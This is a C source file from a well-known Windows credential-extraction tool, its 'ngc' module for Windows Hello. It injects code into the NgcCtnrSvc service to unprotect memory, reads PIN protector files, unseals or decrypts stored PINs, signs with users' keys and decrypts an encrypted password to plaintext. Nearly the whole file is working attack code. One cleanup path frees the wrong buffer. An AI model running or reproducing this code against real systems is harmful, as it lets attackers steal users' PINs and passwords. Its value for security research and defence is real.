/*	Benjamin DELPY `gentilkiwi`
	https://blog.gentilkiwi.com
	benjamin@gentilkiwi.com
	Licence : https://creativecommons.org/licenses/by/4.0/
*/
#include "kuhl_m_ngc.h"

const KUHL_M_C kuhl_m_c_ngc[] = {
	{kuhl_m_ngc_logondata,				L"logondata",				L":)"},
	{kuhl_m_ngc_pin,					L"pin",						L"Try do decrypt a PIN Protector"},
	{kuhl_m_ngc_sign,					L"sign",					L"Try to sign"},
	{kuhl_m_ngc_decrypt,				L"decrypt",					L"Try to decrypt"},
	{kuhl_m_ngc_enum,					L"enum",					NULL},
};

const KUHL_M kuhl_m_ngc = {
	L"ngc",	L"Next Generation Cryptography module (kiwi use only)",	L"Some commands to enumerate credentials...",
	ARRAYSIZE(kuhl_m_c_ngc), kuhl_m_c_ngc, NULL, NULL
};

typedef BOOL (WINAPI * PCRYPTUNPROTECTMEMORY) (__inout LPVOID pDataIn, __in DWORD cbDataIn, __in DWORD dwFlags);
#pragma optimize("", off)
DWORD WINAPI kiwidecode_thread(PREMOTE_LIB_DATA lpParameter)
{
	lpParameter->output.outputData = lpParameter->input.inputData;
	lpParameter->output.outputSize = lpParameter->input.inputSize;
	lpParameter->output.outputStatus = ((PCRYPTUNPROTECTMEMORY) 0x4141414141414141)(lpParameter->input.inputData, lpParameter->input.inputSize, CRYPTPROTECTMEMORY_SAME_PROCESS);
	return STATUS_SUCCESS;
}
DWORD kiwidecode_thread_end(){return 'kide';}
#pragma optimize("", on)

void dealWithStructToDecode(LPCWSTR type, PstructToDecode d, PKULL_M_MEMORY_HANDLE Handle)
{
	KULL_M_MEMORY_ADDRESS aLocalBuffer = {NULL, &KULL_M_MEMORY_GLOBAL_OWN_HANDLE}, aRemoteD = {NULL, Handle};
	PREMOTE_LIB_INPUT_DATA iData;
	REMOTE_LIB_OUTPUT_DATA oData;

	REMOTE_EXT extensions[] = {{L"dpapi.dll", "CryptUnprotectMemory", (PVOID) 0x4141414141414141, NULL},};
	MULTIPLE_REMOTE_EXT extForCb = {ARRAYSIZE(extensions), extensions};
	KULL_M_MEMORY_ADDRESS aRemoteFunc;

	if(d && d->cb && d->toDecode)
	{
		if(aLocalBuffer.address = LocalAlloc(LPTR, d->cb))
		{
			aRemoteD.address = d->toDecode;
			if(kull_m_memory_copy(&aLocalBuffer, &aRemoteD, d->cb))
			{
				kprintf(L"    >  %s (todecode): ", type);
				kull_m_string_wprintf_hex(aLocalBuffer.address, d->cb, 0);
				kprintf(L"\n");

				if(kull_m_remotelib_CreateRemoteCodeWitthPatternReplace(Handle, kiwidecode_thread, (DWORD) ((PBYTE) kiwidecode_thread_end - (PBYTE) kiwidecode_thread), &extForCb, &aRemoteFunc))
				{
					if(iData = kull_m_remotelib_CreateInput(NULL, 0, d->cb, aLocalBuffer.address))
					{
						if(kull_m_remotelib_create(&aRemoteFunc, iData, &oData))
						{
							if(oData.outputSize && oData.outputData)
							{
								if((BOOL) oData.outputStatus)
								{
									kprintf(L"    >> %s (decoded) : ", type);
									kull_m_string_wprintf_hex(oData.outputData, oData.outputSize, 4);
									kprintf(L"\n");
								}
								else PRINT_ERROR(L"Remote SC - CryptUnprotectMemory\n");
							}
						}
						LocalFree(iData);
					}
					kull_m_memory_free(&aRemoteFunc);
				}
				else PRINT_ERROR(L"kull_m_remotelib_CreateRemoteCodeWitthPatternReplace\n");
			}
			LocalFree(aLocalBuffer.address);
		}
	}
}

void dealWithL(PKULL_M_MEMORY_ADDRESS aRemoteL)
{
	structL L;
	KULL_M_MEMORY_ADDRESS aLocalBuffer = {&L, &KULL_M_MEMORY_GLOBAL_OWN_HANDLE};

	if(kull_m_memory_copy(&aLocalBuffer, aRemoteL, sizeof(L)))
	{
		dealWithStructToDecode(L"?empty?", &L.d0, aRemoteL->hMemory);
		dealWithStructToDecode(L"? ? ? ?", &L.d1, aRemoteL->hMemory);
		dealWithStructToDecode(L"SlotPin", &L.d2, aRemoteL->hMemory);
	}
}

void CALLBACK enumit2(IN PValueUnkPtr pValueUnkPtr, IN DWORD szObject, IN PKULL_M_MEMORY_HANDLE hMemory, IN OPTIONAL PVOID pvOptionalData)
{
	KULL_M_MEMORY_ADDRESS aRemoteL;

	kprintf(L"    unkE: ");
	kull_m_string_wprintf_hex(pValueUnkPtr, sizeof(pValueUnkPtr->unkData), 0);
	kprintf(L"\n");

	if(pValueUnkPtr->ptr)
	{
		aRemoteL.hMemory = hMemory;
		aRemoteL.address = pValueUnkPtr->ptr;
		dealWithL(&aRemoteL);
	}
}

//void CALLBACK enumitProvider(IN PValueProvider pValueProvider, IN DWORD szObject, IN PKULL_M_MEMORY_HANDLE hMemory, IN OPTIONAL PVOID pvOptionalData)
//{
//	UNICODE_STRING uPath;
//	uPath.Length = uPath.MaximumLength = (USHORT) (pValueProvider->cbProvider * sizeof(wchar_t));
//	uPath.Buffer = (PWSTR) pValueProvider->Provider;
//	if(kull_m_process_getUnicodeString(&uPath, hMemory))
//	{
//		kprintf(L"  Provider: %wZ\n", &uPath);
//		LocalFree(uPath.Buffer);
//	}
//}

void dealWithF(PKULL_M_MEMORY_ADDRESS aRemoteF)
{
	unkF f;
	KULL_M_MEMORY_ADDRESS aLocalBuffer = {&f, &KULL_M_MEMORY_GLOBAL_OWN_HANDLE}, aRemoteV2;
	UNICODE_STRING uPath;

	if(kull_m_memory_copy(&aLocalBuffer, aRemoteF, sizeof(f)))
	{
		uPath.Length = uPath.MaximumLength = (USHORT) (f.cbProfilePath * sizeof(wchar_t));
		uPath.Buffer = (PWSTR) f.ProfilePath;
		if(kull_m_process_getUnicodeString(&uPath, aRemoteF->hMemory))
		{
			kprintf(L"  Path: %wZ\n", &uPath);
			LocalFree(uPath.Buffer);
		}

		//if(f.t)
		//{
		//	aRemoteV2.hMemory = aRemoteF->hMemory;
		//	aRemoteV2.address = f.t;
		//	kuhl_m_ngc_dealWithMap(&aRemoteV2, enumitProvider, sizeof(ValueProvider), NULL);
		//}

		if(f.u)
		{
			aRemoteV2.hMemory = aRemoteF->hMemory;
			aRemoteV2.address = f.u;
			//kuhl_m_ngc_dealWithMap(&aRemoteV2, enumit2, sizeof(ValueUnkPtr), NULL);
			kuhl_m_ngc_dealWithNode(&aRemoteV2, NULL, enumit2, sizeof(ValueUnkPtr), NULL);
		}
	}
}

void CALLBACK enumit(IN PValueGuidPtr pValueGuidPtr, IN DWORD szObject, IN PKULL_M_MEMORY_HANDLE hMemory, IN OPTIONAL PVOID pvOptionalData)
{
	KULL_M_MEMORY_ADDRESS aRemoteF;

	kprintf(L"\nGUID: ");
	kull_m_string_displayGUID(&pValueGuidPtr->guid);
	kprintf(L"\n");
	
	if(pValueGuidPtr->ptr)
	{
		aRemoteF.hMemory = hMemory;
		aRemoteF.address = pValueGuidPtr->ptr;
		dealWithF(&aRemoteF);
	}
}

NTSTATUS kuhl_m_ngc_logondata(int argc, wchar_t * argv[])
{
	SERVICE_STATUS_PROCESS ServiceStatusProcess;
	HANDLE hProcess;
	KULL_M_PROCESS_VERY_BASIC_MODULE_INFORMATION iModule;
	ContainerManager containerManager;
	KULL_M_MEMORY_ADDRESS aRemote = {NULL, NULL}, aLocalBuffer = {&containerManager, &KULL_M_MEMORY_GLOBAL_OWN_HANDLE};

	if(kull_m_service_getUniqueForName(L"NgcCtnrSvc", &ServiceStatusProcess))
	{
		if(ServiceStatusProcess.dwCurrentState >= SERVICE_RUNNING)
		{
			kprintf(L"Service PID: %u\n", ServiceStatusProcess.dwProcessId);
			if(hProcess = OpenProcess(PROCESS_VM_READ | PROCESS_VM_WRITE | PROCESS_VM_OPERATION | PROCESS_QUERY_INFORMATION | PROCESS_CREATE_THREAD, FALSE, ServiceStatusProcess.dwProcessId))
			{
				if(kull_m_memory_open(KULL_M_MEMORY_TYPE_PROCESS, hProcess, &aRemote.hMemory))
				{
					if(kull_m_process_getVeryBasicModuleInformationsForName(aRemote.hMemory, L"NgcCtnrSvc.dll", &iModule))
					{
						aRemote.address = (PBYTE) iModule.DllBase.address + /*0xB4F90;//*/0xbef10; // ContainerManager -- InternalUninitializeService@@YAXXZ proc near
						if(kull_m_memory_copy(&aLocalBuffer, &aRemote, sizeof(containerManager)))
						{
							aRemote.address = containerManager.unk7;
							//kuhl_m_ngc_dealWithMap(&aRemote, enumit, sizeof(ValueGuidPtr), NULL);
							kuhl_m_ngc_dealWithNode(&aRemote, NULL, enumit, sizeof(ValueGuidPtr), NULL);
						}
					}
					else PRINT_ERROR_AUTO(L"kull_m_process_getVeryBasicModuleInformationsForName");
					kull_m_memory_close(aRemote.hMemory);
				}
				CloseHandle(hProcess);
			}
			else PRINT_ERROR_AUTO(L"OpenProcess");
		}
		else PRINT_ERROR(L"Service is not running\n");
	}
	else PRINT_ERROR_AUTO(L"kull_m_service_getUniqueForName");
	return STATUS_SUCCESS;
}

void kuhl_m_ngc_dealWithNode(PKULL_M_MEMORY_ADDRESS aNode, PVOID OrigMapAddress, PKUHL_M_NGC_ENUM_NODE_DATA Callback, DWORD szObject, PVOID CallbackData)
{
	Node node;
	KULL_M_MEMORY_ADDRESS aLocalBuffer = {&node, &KULL_M_MEMORY_GLOBAL_OWN_HANDLE}, aValue, aNextNode;

	aNextNode.hMemory = aNode->hMemory;
	if(kull_m_memory_copy(&aLocalBuffer, aNode, sizeof(node)))
	{
		if(!node.IsNil)
		{
			if(szObject && Callback)
			{
				aLocalBuffer.address = LocalAlloc(LPTR, szObject);
				if(aLocalBuffer.address)
				{
					aValue.hMemory = aNode->hMemory;
					aValue.address = (PBYTE) aNode->address + sizeof(Node);
					if(kull_m_memory_copy(&aLocalBuffer, &aValue, szObject))
					{
						Callback(aLocalBuffer.address, szObject, aValue.hMemory, CallbackData);
					}
					LocalFree(aLocalBuffer.address);
				}
			}

			if(node.Color)
			{
				if(node.Left && (node.Left != OrigMapAddress))
				{
					aNextNode.address = node.Left;
					kuhl_m_ngc_dealWithNode(&aNextNode, OrigMapAddress, Callback, szObject, CallbackData);
				}
				
				if(node.Right && (node.Right != OrigMapAddress))
				{
					aNextNode.address = node.Right;
					kuhl_m_ngc_dealWithNode(&aNextNode, OrigMapAddress, Callback, szObject, CallbackData);
				}
			}
		}
		else if(!OrigMapAddress && node.Parent && (node.Parent != aNode->address))
		{
			aNextNode.address = node.Parent;
			kuhl_m_ngc_dealWithNode(&aNextNode, aNode->address, Callback, szObject, CallbackData);
		}
	}
}

LPCWSTR ngcRoot = L"C:\\Windows\\ServiceProfiles\\LocalService\\AppData\\Local\\Microsoft\\Ngc";
BOOL getContent(DWORD dwReadFlags, LPCWSTR Root, LPCWSTR guid, BOOL isData, BOOL isProtectors, LPCWSTR Sub, DWORD num, PBYTE *data, DWORD *cbData)
{
	BOOL status = FALSE;
	PWSTR buffer;

	if(kull_m_string_sprintf(&buffer, L"%s\\%s\\%s%s%s%u.dat", Root ? Root : ngcRoot, guid, isData ? L"{93F10861-19F1-42B8-AD24-93A28E9C4096}\\" : (isProtectors ? L"Protectors\\" : L""), Sub ? Sub : L"", Sub ? L"\\" : L"", num))
	{
		status = kull_m_file_readGeneric(buffer, data, cbData, dwReadFlags);
		LocalFree(buffer);
	}
	return status;
}

#define ID_PROTECTOR_PROVIDER	1
#define ID_PROTECTOR_KEYNAME	2
//#define ID_PROTECTOR_
#define ID_PROTECTOR_TIMESTAMP	9
//#define ID_PROTECTOR_
#define ID_PROTECTOR_ENC_PINS	15

void printUnkPins(PUNK_RAW_PIN pRaw)
{
	if(pRaw->cbPin0)
	{
		kprintf(L"  UnkPin    : ");
		kull_m_string_wprintf_hex(pRaw->data, pRaw->cbPin0, 4);
		kprintf(L"\n");
	}
	if(pRaw->cbPin1)
	{
		kprintf(L"  DecryptPin: ");
		kull_m_string_wprintf_hex(pRaw->data + pRaw->cbPin0, pRaw->cbPin1, 4);
		kprintf(L"\n");
	}
	if(pRaw->cbPin2)
	{
		kprintf(L"  SignPin   : ");
		kull_m_string_wprintf_hex(pRaw->data + pRaw->cbPin0 + pRaw->cbPin1, pRaw->cbPin2, 4);
		kprintf(L"\n");
	}
}

NTSTATUS kuhl_m_ngc_pin(int argc, wchar_t * argv[])
{
	SECURITY_STATUS status;
	NCRYPT_PROV_HANDLE hProv;
	LPCWSTR guid, pin;
	LPWSTR szProviderName, szKeyName, domain, name;
	PBYTE data, UserPin = NULL, EncryptedPins;
	DWORD cbData, cbResult, dwReadFlags = kull_m_string_args_byName(argc, argv, L"withbackup", NULL, NULL) ? FILE_FLAG_BACKUP_SEMANTICS : 0, dwImplType, dwUserPin = 0, dwEncryptedPins;
	PUNK_RAW_PIN pRaw;
	PSID pSid;
	char *aPin;

	if(kull_m_string_args_byName(argc, argv, L"guid", &guid, NULL))
	{
		if(getContent(dwReadFlags, NULL, guid, FALSE, FALSE, NULL, 1, &data, &cbData))
		{
			kprintf(L"User SID  : %.*s", cbData / sizeof(wchar_t), data);
			if(ConvertStringSidToSid((LPCWSTR) data, &pSid))
			{
				if(kull_m_token_getNameDomainFromSID(pSid, &name, &domain, NULL, NULL))
				{
					kprintf(L" ( %s\\%s )", domain, name);
					LocalFree(name);
					LocalFree(domain);
				}
				LocalFree(pSid);
			}
			kprintf(L"\n");
			LocalFree(data);
		}

		if(kull_m_string_args_byName(argc, argv, L"pin", &pin, NULL))
		{
			if(aPin = kull_m_string_unicode_to_ansi(pin))
			{
				kprintf(L"Pin code  : %S\nHex pin   : ", aPin);
				if(UserPin = kull_m_crypto_ngc_pin_BinaryPinToPinProperty((LPCBYTE) aPin, lstrlenA(aPin), &dwUserPin))
				{
					kull_m_string_wprintf_hex(UserPin, dwUserPin - sizeof(wchar_t), 0);
					kprintf(L"(");
					kull_m_string_wprintf_hex(UserPin + dwUserPin - sizeof(wchar_t), sizeof(wchar_t), 0);
					kprintf(L")");
				}
				kprintf(L"\n");
				LocalFree(aPin);
			}
		}

		if(getContent(dwReadFlags, NULL, guid, FALSE, TRUE, L"1", ID_PROTECTOR_TIMESTAMP, &data, &cbData))
		{
			kprintf(L"Timestamp : ");
			kull_m_string_displayLocalFileTime((PFILETIME) data);
			kprintf(L"\n");
			LocalFree(data);
		}

		if(getContent(dwReadFlags, NULL, guid, FALSE, TRUE, L"1", ID_PROTECTOR_ENC_PINS, &EncryptedPins, &dwEncryptedPins))
		{
			if(getContent(dwReadFlags, NULL, guid, FALSE, TRUE, L"1", ID_PROTECTOR_PROVIDER, (PBYTE *) &szProviderName, &cbData))
			{
				kprintf(L"Provider  : %.*s\n", cbData / sizeof(wchar_t), szProviderName);
				status = NCryptOpenStorageProvider(&hProv, szProviderName, 0);
				if(status == ERROR_SUCCESS)
				{
					status = NCryptGetProperty(hProv, NCRYPT_IMPL_TYPE_PROPERTY, (PBYTE) &dwImplType, sizeof(dwImplType), &cbResult, 0);
					if(status == ERROR_SUCCESS)
					{
						if(dwImplType == NCRYPT_IMPL_HARDWARE_FLAG)
						{
							if(UserPin && dwUserPin)
							{
								status = kull_m_crypto_ngc_hardware_unseal(hProv, UserPin, dwUserPin, EncryptedPins, dwEncryptedPins, (PBYTE *) &pRaw, &cbResult);
								if(status == ERROR_SUCCESS)
								{
									printUnkPins(pRaw);
									LocalFree(pRaw);
								}
							}
						}
						else if(dwImplType == NCRYPT_IMPL_SOFTWARE_FLAG)
						{
							if(getContent(dwReadFlags, NULL, guid, FALSE, TRUE, L"1", ID_PROTECTOR_KEYNAME, (PBYTE *) &szKeyName, &cbData))
							{
								kprintf(L"KeyName   : %.*s\n", cbData / sizeof(wchar_t), szKeyName);
								if(UserPin && dwUserPin)
								{
									status = kull_m_crypto_ngc_software_decrypt(hProv, szKeyName, UserPin, dwUserPin, EncryptedPins, dwEncryptedPins, (PBYTE *) &pRaw, &cbResult);
									if(status == ERROR_SUCCESS)
									{
										printUnkPins(pRaw);
										LocalFree(pRaw);
									}
								}
								LocalFree(szKeyName);
							}
						}
						else PRINT_ERROR(L"dwImplType: 0x%08x\n", dwImplType);
					}
					else PRINT_ERROR(L"NCryptGetProperty(NCRYPT_IMPL_TYPE_PROPERTY): 0x%08x\n", status);
					status = NCryptFreeObject(hProv);
				}
				else PRINT_ERROR(L"NCryptOpenStorageProvider: 0x%08x\n", status);
				LocalFree(szProviderName);
			}
			LocalFree(EncryptedPins);
		}

		if(UserPin)
			LocalFree(UserPin);
	}
	else PRINT_ERROR(L"guid argument is missing\n");

	return STATUS_SUCCESS;
}

NTSTATUS kuhl_m_ngc_sign(int argc, wchar_t * argv[])
{
	SECURITY_STATUS status;
	NCRYPT_PROV_HANDLE hProv;
	NCRYPT_KEY_HANDLE hKey;

	BCRYPT_PKCS1_PADDING_INFO PaddingInfo = {NULL};

	BYTE hash[] = {0x30, 0x31, 0x30, 0x0D, 0x06, 0x09, 0x60, 0x86, 0x48, 0x01, 0x65, 0x03, 0x04, 0x02, 0x01, 0x05, 0x00, 0x04, 0x20, 0x7C, 0xB6, 0xD7, 0x64, 0xE2, 0xEA, 0x56, 0xEB, 0xF3, 0x6C, 0x98, 0xDD, 0xBC, 0x84, 0x11, 0xCD, 0xE4, 0x86, 0x10, 0x3B, 0x1C, 0x58, 0xCA, 0xAD, 0xAD, 0x21, 0xD0, 0xCB, 0xEC, 0x1C, 0x9F, 0x30};
	BYTE sign[256] = {0};

	DWORD cbResult = 0;
	PCWSTR szKey, szPin;

	if(kull_m_string_args_byName(argc, argv, L"key", &szKey, NULL))
	{
		kprintf(L"Key: %s\n", szKey);
		if(kull_m_string_args_byName(argc, argv, L"pin", &szPin, NULL))
		{
			kprintf(L"PIN: %s\n", szPin);
			status = NCryptOpenStorageProvider(&hProv, MS_PLATFORM_CRYPTO_PROVIDER /**/, 0);
			if(status == ERROR_SUCCESS)
			{
				status = NCryptOpenKey(hProv, &hKey, szKey, 0, NCRYPT_SILENT_FLAG);
				if(status == ERROR_SUCCESS)
				{
					status = NCryptSetProperty(hKey, NCRYPT_PIN_PROPERTY, (PBYTE) szPin, (lstrlen(szPin) + 1) * sizeof(wchar_t), NCRYPT_SILENT_FLAG);
					if(status == ERROR_SUCCESS)
					{
						kprintf(L"Data (ASN1 hash):\n");
						kull_m_string_wprintf_hex(hash, sizeof(hash), 1 | (32 << 16));
						kprintf(L"\n");

						status = NCryptSignHash(hKey, &PaddingInfo, hash, sizeof(hash), sign, sizeof(sign), &cbResult, NCRYPT_SILENT_FLAG | BCRYPT_PAD_PKCS1);
						if(status == ERROR_SUCCESS)
						{
							kprintf(L"Signature:\n");
							kull_m_string_wprintf_hex(sign, sizeof(sign), 1 | (32 << 16));
							kprintf(L"\n");
						}
						else PRINT_ERROR(L"NCryptSignHash: 0x%08x\n", status);
					}
					else PRINT_ERROR(L"NCryptSetProperty(%s): 0x%08x\n", NCRYPT_PIN_PROPERTY, status);
					status = NCryptFreeObject(hProv);
				}
				else if(status == NTE_BAD_KEYSET)
					PRINT_ERROR(L"The specified key was not found, did you impersonate localservice?\n");
				else PRINT_ERROR(L"NCryptOpenKey: 0x%08x\n", status);
				status = NCryptFreeObject(hProv);
			}
			else PRINT_ERROR(L"NCryptOpenStorageProvider: 0x%08x\n", status);
		}
		else PRINT_ERROR(L"pin argument is missing\n");
	}
	else PRINT_ERROR(L"key argument is missing\n");

	return STATUS_SUCCESS;
}

NTSTATUS kuhl_m_ngc_decrypt(int argc, wchar_t * argv[])
{
	SECURITY_STATUS status;
	NCRYPT_PROV_HANDLE hProv;
	LPCWSTR szProvider, szKeyName, szData, szPin, szIV, szEncPassword;
	PBYTE pbData, pbOutput, pbIV, pbEncPassword, pbPassword;
	DWORD cbData, cbOutput, cbIV, cbEncPassword, cbPassword;
	BCRYPT_ALG_HANDLE hAlg;
	BCRYPT_KEY_HANDLE hKey;

	kull_m_string_args_byName(argc, argv, L"provider", &szProvider, MS_KEY_STORAGE_PROVIDER);
	if(kull_m_string_args_byName(argc, argv, L"keyname", &szKeyName, NULL))
	{
		if(kull_m_string_args_byName(argc, argv, L"pin", &szPin, NULL))
		{
			if(kull_m_string_args_byName(argc, argv, L"data", &szData, NULL) || kull_m_string_args_byName(argc, argv, L"enckey", &szData, NULL))
			{
				if(kull_m_string_stringToHexBuffer(szData, &pbData, &cbData))
				{
					kprintf(L"Provider   : %s\nKeyName    : %s\nKey PIN    : %s\nData       : ", szProvider, szKeyName, szPin);
					kull_m_string_wprintf_hex(pbData, cbData, 0);
					kprintf(L"\n");
					status = NCryptOpenStorageProvider(&hProv, szProvider, 0);
					if(status == ERROR_SUCCESS)
					{
						status = kull_m_crypto_ngc_software_decrypt(hProv, szKeyName, (LPCBYTE) szPin, (lstrlen(szPin) + 1) * sizeof(wchar_t), pbData, cbData, &pbOutput, &cbOutput);
						if(status == ERROR_SUCCESS)
						{
							kprintf(L"Output     : ");
							kull_m_string_wprintf_hex(pbOutput, cbOutput, 0);
							kprintf(L"\n");
							if(kull_m_string_args_byName(argc, argv, L"iv", &szIV, NULL) && kull_m_string_args_byName(argc, argv, L"encPassword", &szEncPassword, NULL))
							{
								if(kull_m_string_stringToHexBuffer(szIV, &pbIV, &cbIV))
								{
									kprintf(L"IV         : ");
									kull_m_string_wprintf_hex(pbIV, cbIV, 0);
									kprintf(L"\n");
									if(kull_m_string_stringToHexBuffer(szEncPassword, &pbEncPassword, &cbEncPassword))
									{
										kprintf(L"EncPassword: ");
										kull_m_string_wprintf_hex(pbEncPassword, cbEncPassword, 0);
										kprintf(L"\n");

										status = BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, NULL, 0);
										if(status == STATUS_SUCCESS)
										{
											status = BCryptGenerateSymmetricKey(hAlg, &hKey, NULL, 0, pbOutput, cbOutput, 0);
											if(status == STATUS_SUCCESS)
											{
												status = BCryptDecrypt(hKey, pbEncPassword, cbEncPassword, NULL, pbIV, cbIV, NULL, 0, &cbPassword, BCRYPT_BLOCK_PADDING);
												if(status == STATUS_SUCCESS)
												{
													if(pbPassword = (PBYTE) LocalAlloc(LPTR, cbPassword))
													{
														status = BCryptDecrypt(hKey, pbEncPassword, cbEncPassword, NULL, pbIV, cbIV, pbPassword, cbPassword, &cbPassword, BCRYPT_BLOCK_PADDING);
														if(status == STATUS_SUCCESS)
														{
															kprintf(L"\nPassword   : %.*s\n", cbPassword / sizeof(wchar_t), pbPassword);
														}
														else PRINT_ERROR(L"BCryptDecrypt(data): 0x%08x\n", status);
														LocalFree(pbPassword);
													}
												}
												else PRINT_ERROR(L"BCryptDecrypt(init): 0x%08x\n", status);
												BCryptDestroyKey(hKey);
											}
											else PRINT_ERROR(L"BCryptGenerateSymmetricKey: 0x%08x\n", status);
											BCryptCloseAlgorithmProvider(hAlg, 0);
										}
										else PRINT_ERROR(L"BCryptOpenAlgorithmProvider: 0x%08x\n", status);
										LocalFree(pbEncPassword);
									}
									else PRINT_ERROR(L"unable to convert encPassword from hex\n");
									LocalFree(pbIV);
								}
								else PRINT_ERROR(L"unable to convert IV from hex\n");
							}
							LocalFree(pbOutput);
						}
						NCryptFreeObject(hProv);
					}
					else PRINT_ERROR(L"NCryptOpenStorageProvider: 0x%08x\n", status);
					LocalFree(pbData);
				}
				else PRINT_ERROR(L"unable to convert data from hex\n");
			}
			else PRINT_ERROR(L"a /data (or /enckey) argument is needed\n");
		}
		else PRINT_ERROR(L"a /pin argument is needed\n");
	}
	else PRINT_ERROR(L"a /keyname argument is needed\n");

	return STATUS_SUCCESS;
}

BOOL CALLBACK kuhl_m_ngc_enum_protectors(DWORD level, PCWCHAR fullpath, PCWCHAR path, PVOID pvArg)
{
	DWORD dwAttrib, cbData;
	PBYTE data;
	if(fullpath)
	{
		dwAttrib = GetFileAttributes(fullpath);
		if((dwAttrib != INVALID_FILE_ATTRIBUTES) && (dwAttrib & FILE_ATTRIBUTE_DIRECTORY))
		{
			kprintf(L"    * %s\n", path, pvArg);
			if(getContent(0, NULL, (LPCWSTR) pvArg, FALSE, TRUE, path, ID_PROTECTOR_PROVIDER, &data, &cbData))
			{
				kprintf(L"      Provider : %.*s\n", cbData / sizeof(wchar_t), data);
				LocalFree(data);
			}
			if(getContent(0, NULL, (LPCWSTR) pvArg, FALSE, TRUE, path, ID_PROTECTOR_KEYNAME, &data, &cbData))
			{
				kprintf(L"      Key Name : %.*s\n", cbData / sizeof(wchar_t), data);
				LocalFree(data);
			}
			if(getContent(0, NULL, (LPCWSTR) pvArg, FALSE, TRUE, path, ID_PROTECTOR_TIMESTAMP, &data, &cbData))
			{
				kprintf(L"      Timestamp: ");
				kull_m_string_displayLocalFileTime((PFILETIME) data);
				kprintf(L"\n");
				LocalFree(data);
			}
			if(getContent(0, NULL, (LPCWSTR) pvArg, FALSE, TRUE, path, ID_PROTECTOR_ENC_PINS, &data, &cbData))
			{
				kprintf(L"      Enc PINs : %u byte(s)\n", cbData);
				LocalFree(data);
			}
			kprintf(L"\n");
		}
	}
	return FALSE;
}

BOOL CALLBACK kuhl_m_ngc_enum_U(DWORD level, PCWCHAR fullpath, PCWCHAR path, PVOID pvArg)
{
	DWORD dwAttrib, cbData;
	PBYTE data;
	if(fullpath && _wcsicmp(path, L"{93F10861-19F1-42B8-AD24-93A28E9C4096}"))
	{
		dwAttrib = GetFileAttributes(fullpath);
		if((dwAttrib != INVALID_FILE_ATTRIBUTES) && (dwAttrib & FILE_ATTRIBUTE_DIRECTORY))
		{
			kprintf(L"    * %s\n", path);
			if(getContent(0, NULL, (LPCWSTR) pvArg, TRUE, FALSE, path, 1, &data, &cbData))
			{
				kprintf(L"      Name     : %.*s\n", cbData / sizeof(wchar_t), data);
				LocalFree(data);
			}
			if(getContent(0, NULL, (LPCWSTR) pvArg, TRUE, FALSE, path, 2, &data, &cbData))
			{
				kprintf(L"      Provider : %.*s\n", cbData / sizeof(wchar_t), data);
				LocalFree(data);
			}
			if(getContent(0, NULL, (LPCWSTR) pvArg, TRUE, FALSE, path, 3, &data, &cbData))
			{
				kprintf(L"      Key Name : %.*s\n", cbData / sizeof(wchar_t), data);
				LocalFree(data);
			}
			if(getContent(0, NULL, (LPCWSTR) pvArg, TRUE, FALSE, path, 4, &data, &cbData))
			{
				kprintf(L"      Certificate:\n");
				kull_m_string_wprintf_hex(data, cbData, 1 | (32 << 16));
				kprintf(L"\n");
				LocalFree(data);
			}
			kprintf(L"\n");
		}
	}
	return FALSE;
}

BOOL CALLBACK kuhl_m_ngc_enum_directory(DWORD level, PCWCHAR fullpath, PCWCHAR path, PVOID pvArg)
{
	DWORD dwAttrib, cbData;
	PBYTE data;
	PSID pSid;
	PWSTR name, domain, fullpathProtectors, fullpathU;

	if(fullpath)
	{
		dwAttrib = GetFileAttributes(fullpath);
		if((dwAttrib != INVALID_FILE_ATTRIBUTES) && (dwAttrib & FILE_ATTRIBUTE_DIRECTORY))
		{
			kprintf(L"\n* %s\n", path);

			if(getContent(0, NULL, path, FALSE, FALSE, NULL, 1, &data, &cbData))
			{
				kprintf(L"    User SID     : %.*s", cbData / sizeof(wchar_t), data);
				if(ConvertStringSidToSid((LPCWSTR) data, &pSid))
				{
					if(kull_m_token_getNameDomainFromSID(pSid, &name, &domain, NULL, NULL))
					{
						kprintf(L" ( %s\\%s )", domain, name);
						LocalFree(name);
						LocalFree(domain);
					}
					LocalFree(pSid);
				}
				kprintf(L"\n");
				LocalFree(data);
			}

			if(getContent(0, NULL, path, FALSE, FALSE, NULL, 7, &data, &cbData))
			{
				kprintf(L"    Main Provider: %.*s\n", cbData / sizeof(wchar_t), data);
				LocalFree(data);
			}

			if(fullpathProtectors = (wchar_t *) LocalAlloc(LPTR, MAX_PATH * sizeof(wchar_t)))
			{
				if(wcscpy_s(fullpathProtectors, MAX_PATH, fullpath) == 0)
				{
					if(wcscat_s(fullpathProtectors, MAX_PATH, L"\\") == 0)
					{
						if(wcscat_s(fullpathProtectors, MAX_PATH, L"Protectors") == 0)
						{
							kprintf(L"\n    Protectors:\n");
							kull_m_file_Find(fullpathProtectors, NULL, FALSE, 0, FALSE, TRUE, kuhl_m_ngc_enum_protectors, (PVOID) path);
						}
					}
				}
				LocalFree(fullpathProtectors);
			}

			if(fullpathU = (wchar_t *) LocalAlloc(LPTR, MAX_PATH * sizeof(wchar_t)))
			{
				if(wcscpy_s(fullpathU, MAX_PATH, fullpath) == 0)
				{
					if(wcscat_s(fullpathU, MAX_PATH, L"\\") == 0)
					{
						if(wcscat_s(fullpathU, MAX_PATH, L"{93F10861-19F1-42B8-AD24-93A28E9C4096}") == 0)
						{
							kprintf(L"\n    {93F10861-19F1-42B8-AD24-93A28E9C4096}:\n");
							kull_m_file_Find(fullpathU, NULL, FALSE, 0, FALSE, TRUE, kuhl_m_ngc_enum_U, (PVOID) path);
						}
					}
				}
				LocalFree(fullpathProtectors);
			}
		}
	}
	return FALSE;
}

NTSTATUS kuhl_m_ngc_enum(int argc, wchar_t * argv[])
{
	kull_m_file_Find(ngcRoot, NULL, FALSE, 0, FALSE, TRUE, kuhl_m_ngc_enum_directory, NULL);
	return STATUS_SUCCESS;
}